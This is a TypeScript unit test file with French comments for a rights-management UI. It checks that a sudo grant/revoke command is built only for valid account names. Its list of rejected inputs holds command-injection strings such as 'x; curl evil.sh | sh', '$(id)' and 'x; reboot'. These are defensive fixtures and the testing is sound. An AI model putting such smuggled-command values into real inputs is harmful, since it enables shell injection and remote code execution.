import { describe, expect, it } from "vitest";
import { canAct, grantCommand, type RightsState, rightsGate } from "./rights";

// Le droit « gérer les services » (HRT-78) : ce que chaque profil voit et la commande à copier. Fonctions pures.
const known = (granted: boolean, account = "marie", knownByAgent = true): RightsState => ({
  phase: "known",
  rights: { known: knownByAgent, granted, gameSettings: knownByAgent, account },
});

describe("grantCommand (BR-GRANT-013)", () => {
  it("accorde (--grant) un compte qui n'a pas le droit, le retire (--revoke) à celui qui l'a", () => {
    expect(grantCommand("marie", false)).toBe("sudo hearth-agent account services marie --grant");
    expect(grantCommand("marie", true)).toBe("sudo hearth-agent account services marie --revoke");
  });

  it("n'est construite que pour un identifiant valide", () => {
    for (const bad of [
      "",
      "ab",
      "x; curl evil.sh | sh",
      "marie user",
      "marie\n--revoke",
      "$(id)",
      "`id`",
      "-marie",
      "Marie",
      "marie‮x",
      "a".repeat(33),
    ]) {
      expect(grantCommand(bad, false), JSON.stringify(bad)).toBeNull();
      expect(grantCommand(bad, true), JSON.stringify(bad)).toBeNull();
    }
  });

  it("accepte un identifiant Hearth commençant par un chiffre, refuse le tiret initial", () => {
    expect(grantCommand("3615paul", false)).toBe(
      "sudo hearth-agent account services 3615paul --grant",
    );
    expect(grantCommand("-marie", false)).toBeNull();
    expect(grantCommand("--grant", true)).toBeNull();
  });

  it("ne contient jamais autre chose que le nom du compte entre les mots fixes", () => {
    const command = grantCommand("svc_1", false) ?? "";
    expect(command.split(" ")).toEqual([
      "sudo",
      "hearth-agent",
      "account",
      "services",
      "svc_1",
      "--grant",
    ]);
    expect(command).not.toMatch(/[\r\n;|&$`]/);
  });
});

describe("rightsGate : les quatre profils (BR-GRANT-014)", () => {
  it("A, administrateur avec le droit : les boutons sont actifs", () => {
    const gate = rightsGate({ state: known(true), isAdmin: true, engine: "ready" });
    expect(gate).toEqual({ kind: "allowed" });
    expect(canAct(gate)).toBe(true);
  });

  it("B, administrateur sans le droit : la raison et la commande à copier", () => {
    const gate = rightsGate({ state: known(false), isAdmin: true, engine: "ready" });
    expect(gate).toEqual({
      kind: "denied",
      isAdmin: true,
      command: "sudo hearth-agent account services marie --grant",
    });
    expect(canAct(gate)).toBe(false);
  });

  it("C, lecture seule sans le droit : la raison, jamais la commande", () => {
    const gate = rightsGate({ state: known(false, "paul"), isAdmin: false, engine: "ready" });
    expect(gate).toEqual({ kind: "denied", isAdmin: false, command: null });
  });

  it("D, lecture seule avec le droit : les boutons sont actifs", () => {
    const gate = rightsGate({ state: known(true, "paul"), isAdmin: false, engine: "ready" });
    expect(canAct(gate)).toBe(true);
  });

  it("administrateur sans le droit dont l'identifiant n'est pas valide : pas de commande", () => {
    const gate = rightsGate({
      state: known(false, "x; reboot"),
      isAdmin: true,
      engine: "ready",
    });
    expect(gate).toEqual({ kind: "denied", isAdmin: true, command: null });
  });
});

describe("rightsGate : les autres états", () => {
  it("lecture en cours ou pas encore lancée : boutons désactivés sans raison (états UI)", () => {
    expect(rightsGate({ state: undefined, isAdmin: true, engine: null })).toEqual({
      kind: "reading",
    });
    expect(
      rightsGate({ state: { phase: "reading", rights: null }, isAdmin: true, engine: null }),
    ).toEqual({ kind: "reading" });
  });

  it("lecture en échec : la raison de l'échec, même si un ancien droit était connu", () => {
    const state: RightsState = { phase: "failed", rights: known(true).rights };
    expect(rightsGate({ state, isAdmin: true, engine: "ready" })).toEqual({ kind: "failed" });
  });

  it("agent ancien : aucune action, quel que soit le droit annoncé (BR-GRANT-016)", () => {
    const state = known(true, "marie", false);
    expect(rightsGate({ state, isAdmin: true, engine: "ready" })).toEqual({ kind: "old-agent" });
  });

  it("pilotage désactivé : l'état du moteur l'emporte, même sur un compte qui a le droit (BR-GRANT-015)", () => {
    for (const state of [known(true), known(false), undefined, known(true, "marie", false)]) {
      expect(rightsGate({ state, isAdmin: true, engine: "disabled" })).toEqual({
        kind: "engine-disabled",
      });
    }
  });
});
